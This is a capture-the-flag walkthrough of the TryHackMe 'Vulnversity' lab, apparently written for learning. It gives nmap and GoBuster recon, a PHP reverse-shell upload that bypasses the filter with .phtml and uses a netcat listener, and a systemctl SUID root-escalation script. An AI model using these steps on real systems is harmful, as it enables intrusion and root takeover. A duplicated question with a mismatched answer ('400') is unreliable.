---
title: Try Hack Me - Vulnversity - Learning
date: 2022-12-22
tags: [Vulnversity,THM,CTF]
image: vuln.png
---
Learn about active recon, web app attacks and privilege escalation.
---

**Machine IP=YOUR MACHINE IP**

### Task 1 - Deploy the Machine

- Need to Deploy the Machine and connect to Open Vpn. If you do not know how to connect to Open VPN.
Look at [OpenVPN](https://tryhackme.com/room/openvpn) 

### Task 3 - Locating directories uning GoBuster
- Gather information about this machine using a network scanning tool called nmap. 
Check out the [Nmap](https://tryhackme.com/room/furthernmap) room for more on this!

#### Questions

1. There are many nmap [cheatsheets](https://cdn.comparitech.com/wp-content/uploads/2019/06/Nmap-Cheat-Sheet-1.webp) online that you can use too. - **Answer** NO Answer, just click **Completed** 
2. Scan the box, how many ports are open? **Answer** **6**
3. What version of the squid proxy is running on the machine? - **Answer** **3.5.12**
4. What version of the squid proxy is running on the machine? - **Answer** **400**
5. Using the nmap flag -n what will it not resolve? - **Answer** **DNS**
6. What is the most likely operating system this machine is running? - **Answer** **Ubuntu**
7. What port is the web server running on? - **Answer** **3333**
8. Its important to ensure you are always doing your reconnaissance thoroughly before progressing. Knowing all open services (which can all be points of exploitation) is very important, don't forget that ports on a higher range might be open so always scan ports after 1000 (even if you leave scanning in the background) - **Answer** NO Answer, just click **Completed** 

### Task 3 - Locating directories using GoBuster
- Using a fast directory discovery tool called GoBuster you will locate a directory that you can use to upload a shell to.

- Lets first start of by scanning the website to find any hidden directories. To do this, we're going to use GoBuster.
GoBuster is a tool used to brute-force URIs (directories and files), DNS subdomains and virtual host names. For this machine, we will focus on using it to brute-force directories.

#### Questions
1. Now lets run GoBuster with a wordlist: gobuster dir -u http://<ip>:3333 -w <word list location> - **Answer** NO Answer, just click **Completed** 
2. What is the directory that has an upload form page? - **Answer** **/internal/**

### Task 4 Compromise the webserver
Now you have found a form to upload files, we can leverage this to upload and execute our payload that will lead to compromising the web server.

#### Reverse PHP Shell

Now we know what extension we can use for our payload we can progress.

We are going to use a PHP reverse shell as our payload. A reverse shell works by being called on the remote host and forcing this host to make a connection to you. So you'll listen for incoming connections, upload and have your shell executed which will beacon out to you to control!

Download the following reverse PHP shell [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

To gain remote access to this machine, follow these steps:

- Edit the php-reverse-shell.php file and edit the ip to be your tun0 ip (you can get this by going to http://<ip> in the browser of your TryHackMe connected device).

- Rename this file to php-reverse-shell.phtml

- We're now going to listen to incoming connections using netcat. Run the following command: nc -lvnp 1234

- Upload your shell and navigate to http://<ip>:3333/internal/uploads/php-reverse-shell.phtml - This will execute your payload

#### Questions
1. What common file type, which you'd want to upload to exploit the server, is blocked? Try a couple to find out. - **Answer** **.php** 

<!-- Need to Add a Image --!>

2. To identify which extensions are not blocked, we're going to fuzz the upload form.
To do this, we're going to use BurpSuite. If you are unsure to what BurpSuite is, or how to set it up please completeour [BurpSuite](https://tryhackme.com/room/rpburpsuite) room first. - **Answer** NO Answer, just click **Completed**

<!-- Need to Add a Image --!>

3. Run this attack, what extension is allowed? - **Answer** **.phtml**


4. You should see a connection on your netcat session **Answer** NO Answer, just click **Completed** 

<!-- Need to Add a Image --!>

5. What is the name of the user who manages the webserver **Answer** **bill**

6. What is the user flag **Answer** **You can find it as a user Flag**

### Task 5 Privilege Escalation
Now you have compromised this machine, we are going to escalate our privileges and become the superuser (root).

[GTFOBins](https://gtfobins.github.io/) is the best tool for bypass local security restrictions but to bypass the [systemctl](https://gtfobins.github.io/gtfobins/systemctl/) binary you need to modify this script to work with SystemCTL

<code>
sudo install -m =xs $(which systemctl) .

TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
<code>

#### Questions
1. On the system, search for all SUID files. What file stands out? **Answer** **/bin/systemctl**

2. Become root and get the last flag (/root/root.txt) **Answer**  **You can find it as a root Flag**

{{< youtube hvYWCegfEZs>}} 

